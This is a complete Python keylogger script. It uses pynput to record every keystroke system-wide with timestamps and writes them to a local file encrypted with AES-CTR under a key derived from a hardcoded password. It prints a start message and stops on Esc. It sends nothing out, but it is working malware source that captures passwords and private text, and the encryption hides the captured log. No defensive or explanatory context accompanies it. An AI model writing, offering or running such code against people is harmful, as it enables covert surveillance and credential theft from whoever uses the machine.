from pynput import keyboard
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
import os, time

PASSWORD = "securepassword123"
LOG_FILE = "keystrokes.enc"
KEY_INFO_FILE = "key_info.bin"

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
    )
    return kdf.derive(password.encode())

def init_cipher():
    salt = os.urandom(16)
    nonce = os.urandom(16)
    key = derive_key(PASSWORD, salt)
    with open(KEY_INFO_FILE, 'wb') as f:
        f.write(salt + nonce)
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
    return cipher.encryptor()

encryptor = init_cipher()

def encrypt_log(text):
    with open(LOG_FILE, 'ab') as f:
        f.write(encryptor.update(text.encode()))

start_time = time.time()
encrypt_log("==== Encrypted Keystroke Log Started ====\n")

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    timestamp = round(time.time() - start_time, 3)
    log_entry = f"{timestamp} | {key_str}\n"
    encrypt_log(log_entry)
    if key == keyboard.Key.esc:
        encrypt_log("==== Logging Ended ====\n")
        return False

print("Encrypted Keylogger started. Press 'Esc' to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
print("Keylogger stopped.")
